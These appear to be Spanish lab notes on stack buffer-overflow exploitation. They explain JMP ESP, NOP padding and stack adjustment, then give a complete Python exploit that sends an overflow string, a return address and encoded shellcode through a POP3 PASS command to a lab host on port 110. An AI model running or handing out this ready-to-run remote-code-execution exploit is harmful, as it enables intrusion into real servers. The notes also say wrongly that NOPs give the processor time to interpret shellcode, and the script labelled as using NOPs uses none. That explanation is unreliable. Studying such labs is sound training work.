Una vez que se ha encontrado la dirección del opcode que aplica el salto al registro **ESP**, es posible que el shellcode no sea interpretado correctamente debido a que su ejecución puede requerir más tiempo del que el procesador tiene disponible antes de continuar con la siguiente instrucción del programa.

Para solucionar este problema, se suelen utilizar técnicas como la introducción de **NOPS** (**instrucciones de no operación**) antes del shellcode en la pila. Los NOPS no realizan ninguna operación, pero permiten que el procesador tenga tiempo adicional para interpretar el shellcode antes de continuar con la siguiente instrucción del programa.

Otra técnica que se suele utilizar es el desplazamiento en la pila, que implica modificar el registro ESP para reservar espacio adicional para el shellcode y permitir que se ejecute sin problemas. Por ejemplo, se puede utilizar la instrucción “**sub esp, 0x10**” para desplazar el registro ESP **16 bytes** hacia abajo en la pila y reservar espacio adicional para el shellcode.

Ya con esto, ¡habríamos conseguido vulnerar el sistema a través del Buffer Overflow

Script en python para el uso de NOPS

```python 
 1   │ #!/usr/bin/python3
   2   │ from struct import pack
   3   │ import socket
   4   │ import sys
   5   │ 
   6   │ #Variables globales
   7   │ 
   8   │ ip_address = "10.47.1.42"
   9   │ lport = 110
  10   │ offset = 4655
  11   │ 
  12   │ before_eip = b"A"*offset
  13   │ 
  14   │ eip = pack("<L", 0x5f4c4d13)
  15   │ 
  16   │ shell_code = (b"\xb8\x1f\xfa\x24\xd3\xd9\xe5\xd9\x74\x24\xf4\x5b\x29\xc9"
  17   │ b"\xb1\x52\x31\x43\x12\x03\x43\x12\x83\xdc\xfe\xc6\x26\x1e"
  18   │ b"\x16\x84\xc9\xde\xe7\xe9\x40\x3b\xd6\x29\x36\x48\x49\x9a"
  19   │ b"\x3c\x1c\x66\x51\x10\xb4\xfd\x17\xbd\xbb\xb6\x92\x9b\xf2"
  20   │ b"\x47\x8e\xd8\x95\xcb\xcd\x0c\x75\xf5\x1d\x41\x74\x32\x43"
  21   │ b"\xa8\x24\xeb\x0f\x1f\xd8\x98\x5a\x9c\x53\xd2\x4b\xa4\x80"
  22   │ b"\xa3\x6a\x85\x17\xbf\x34\x05\x96\x6c\x4d\x0c\x80\x71\x68"
  23   │ b"\xc6\x3b\x41\x06\xd9\xed\x9b\xe7\x76\xd0\x13\x1a\x86\x15"
  24   │ b"\x93\xc5\xfd\x6f\xe7\x78\x06\xb4\x95\xa6\x83\x2e\x3d\x2c"
  25   │ b"\x33\x8a\xbf\xe1\xa2\x59\xb3\x4e\xa0\x05\xd0\x51\x65\x3e"
  26   │ b"\xec\xda\x88\x90\x64\x98\xae\x34\x2c\x7a\xce\x6d\x88\x2d"
  27   │ b"\xef\x6d\x73\x91\x55\xe6\x9e\xc6\xe7\xa5\xf6\x2b\xca\x55"
  28   │ b"\x07\x24\x5d\x26\x35\xeb\xf5\xa0\x75\x64\xd0\x37\x79\x5f"
  29   │ b"\xa4\xa7\x84\x60\xd5\xee\x42\x34\x85\x98\x63\x35\x4e\x58"
  30   │ b"\x8b\xe0\xc1\x08\x23\x5b\xa2\xf8\x83\x0b\x4a\x12\x0c\x73"
  31   │ b"\x6a\x1d\xc6\x1c\x01\xe4\x81\x28\xf9\xe7\xc8\x45\x07\xe7"
  32   │ b"\xeb\x2e\x8e\x01\x81\x40\xc7\x9a\x3e\xf8\x42\x50\xde\x05"
  33   │ b"\x59\x1d\xe0\x8e\x6e\xe2\xaf\x66\x1a\xf0\x58\x87\x51\xaa"
  34   │ b"\xcf\x98\x4f\xc2\x8c\x0b\x14\x12\xda\x37\x83\x45\x8b\x86"
  35   │ b"\xda\x03\x21\xb0\x74\x31\xb8\x24\xbe\xf1\x67\x95\x41\xf8"
  36   │ b"\xea\xa1\x65\xea\x32\x29\x22\x5e\xeb\x7c\xfc\x08\x4d\xd7"
  37   │ b"\x4e\xe2\x07\x84\x18\x62\xd1\xe6\x9a\xf4\xde\x22\x6d\x18"
  38   │ b"\x6e\x9b\x28\x27\x5f\x4b\xbd\x50\xbd\xeb\x42\x8b\x05\x1b"
  39   │ b"\x09\x91\x2c\xb4\xd4\x40\x6d\xd9\xe6\xbf\xb2\xe4\x64\x35"
  40   │ b"\x4b\x13\x74\x3c\x4e\x5f\x32\xad\x22\xf0\xd7\xd1\x91\xf1"
  41   │ b"\xfd")
  42   │ 
  43   │ payload = before_eip + eip + b"\x83\xEC\x10" + shell_code
  44   │ 
  45   │ def exploit():
  46   │ 
  47   │     # Create a socket
  48   │     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  49   │ 
  50   │     # Connect to the server
  51   │ 
  52   │     s.connect((ip_address, lport))
  53   │     
  54   │     # Revice the banner
  55   │      
  56   │     banner = s.recv(1024)
  57   │ 
  58   │     s.send(b"USER lotus" + b'\r\n')
  59   │     response = s.recv(1024)
  60   │     s.send(b"PASS" + payload + b'\r\n')
  61   │     s.close()
  62   │ 
  63   │ if __name__ == "__main__":
  64   │     exploit()  
```
![[Screenshot (32).png]]

![[Screenshot (30).png]]